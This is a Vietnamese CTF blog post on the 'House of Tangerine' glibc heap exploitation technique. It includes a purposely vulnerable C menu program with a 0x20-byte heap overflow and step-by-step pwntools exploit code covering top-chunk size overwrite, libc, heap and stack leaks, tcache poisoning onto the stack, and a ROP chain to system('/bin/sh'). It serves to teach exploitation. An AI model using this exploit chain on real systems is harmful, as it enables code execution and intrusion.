---
title: House of Tangerine
date: 2024-04-30 21-00-53
categories: [CTF]
tags: [research, pwn, heap]
# image: /assets/image/htb.jpg
math: true
---

# House of Tangerine

- House of Tangerine (HOT) là một kĩ thuật gần giống `House of Orange`. `HOT` có thể đưa một chunk vào bin mà không cần `free()` bằng `_int_free`. Vậy điều kiện để gọi được `_int_free`

```c
if (old_size >= MINSIZE)
{
    _int_free (av, old_top, 1);
}
// https://github.com/bminor/glibc/blob/master/malloc/malloc.c#L2911
```

- Nghĩa là nếu size của `top chunk` nhỏ hơn `MINSIZE`, chương trình sẽ dùng `_int_free` để free phần `old_size` đó và malloc 1 top chunk mới

# Ý tưởng

- `HOT` sẽ cần kết hợp `OOB` hoặc `BOF` để có thể ghi đè size `top chunk`. Kết hợp với `tcache-poisoning` để ghi

# Mô phỏng

- Ở đây mình sẽ tạo 1 chall để thử khai thác bằng `HOF`

## Source

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

long int storage[0x20];
long int sizeS[0x20];
int create()
{
    long long size;
    long long idx;
    long long *buf = NULL;
    printf("Size: ");
    scanf("%lld", &size);
    printf("Index: ");
    scanf("%lld", &idx);
    buf = malloc(size);
    if (buf == NULL)
    {
        printf("Error allocating memory\n");
        return 1;
    }
    storage[idx] = (long int)buf;
    sizeS[idx] = size;
    printf("Buffer: ");
    read(0, buf, size + 0x20);

    return 0;
}

int print_func()
{
    int idx;
    printf("idx: ");
    scanf("%d", &idx);
    puts((char *)storage[idx]);
    return 0;
}
int edit()
{
    int idx;
    printf("idx: ");
    scanf("%d", &idx);
    printf("buf: ");
    read(0, (char *)storage[idx], sizeS[idx] + 0x20);
}
int menu()
{
    int choice = 0;
    puts("---Menu---");
    puts("1. Create");
    puts("2. Print ");
    puts("3. Edit ");
    scanf("%d", &choice);
    return choice;
}

int main()
{
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    while (1)
    {
        switch (menu())
        {
        case 1:
            create();
            break;
        case 2:
            print_func();
            break;
        case 3:
            edit();
            break;
        case 4:
            return 0;
        default:
            break;
        }
    }
}
```

## Khai thác

### Leak libc

- Ở `1` mình tạo 1 chunk 0x10 chủ yếu để xem heap có địa chỉ như nào vì nếu mình muốn malloc 1 chunk 0x100 thì size của top chunk có thể là `0x1100, 0x2100...` thì sẽ không bị `1. Forged size must be aligned to the memory page`, giống với House of Orange [link](https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/house_of_orange/#the-correct-example)
- Ở `2` mình sẽ malloc 1 chunk lớn hơn size top chunk đã bị ghi đè ở trước đó để đưa chunk có size lớn vào `unsorted bin` => leak libc

```c
cr(0, 0x10, b'wan')
edit(0, b'wan'.ljust(0x10) + flat(0, 0xd51)) //1
cr(1, 0xe00+0x180, b'\0'*0xe00 + b'wanwan') // 2
cr(2, 0xd20, b'\x01')
leak(2)
libc.address = u64(p.recv(6) + b'\0\0') - 0x1d3c01
info("libc.address: " + hex(libc.address))
```

## Leak heap

- Tương tư ở trên mình sẽ ghi đè top chunk (`3` và `4`) và đưa 2 chunk vào tcache để `tcache-poisoning` (`5` và `6`)

```c
edit(1, b'a'*0xf80 + flat(0, 0x71)) // 3
cr(3, 0xff0-0x70, b'wanwan') // 5
edit(3, b'a'.ljust(0xff0-0x70) + flat(0, 0x71)) // 4
cr(4, 0xff0-0x70, b'wanwan') // 6
edit(1, b'a'*(0xff0-0x70+0x10))
leak(1)
p.recvuntil(b'a'*(0xe00+0x180+0x10))
heap = (u64(p.recvline()[:-1].ljust(8, b'\0')) << 12) - 0x21000
info("heap: " + hex(heap))
```

## Leak stack

```c
edit(3, b'a'*(0xff0-0x70) + flat(0, 0x51,
     (libc.sym.environ-0x10) ^ (heap+0x43fa0 >> 12)))
cr(0, 0x40, b'wan')
cr(0, 0x40, b'a'*0x10)
leak(0)
p.recvuntil(b'a'*0x10)
stack = u64(p.recvline()[:-1] + b'\0\0')
info("stack " + hex(stack))
target = stack - 0x120
```

## tcache-poisoning vào stack và ROP

```c
edit(4, b'a'*(0xff0-0x70) + flat(0, 0x71))
cr(5, 0xff0-0x70, b'wanwan')
edit(5, b'a'*(0xff0-0x70) + flat(0, 0x71))
cr(6, 0xff0-0x70, b'wanwan')
edit(5, b'a'*(0xff0-0x70) + flat(0, 0x51,
                                 (target-8) ^ (heap+0x87fa0 >> 12)))
cr(0, 0x40, b'wan')
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh')))
cr(0, 0x40, b'a'*8 + p64(rop.find_gadget(['ret'])[0]) + bytes(rop))
```

## Kết quả
![](/assets/2024-04-30-Heap/2024-05-01-21-51-39.png)

# Reference
https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_tangerine.c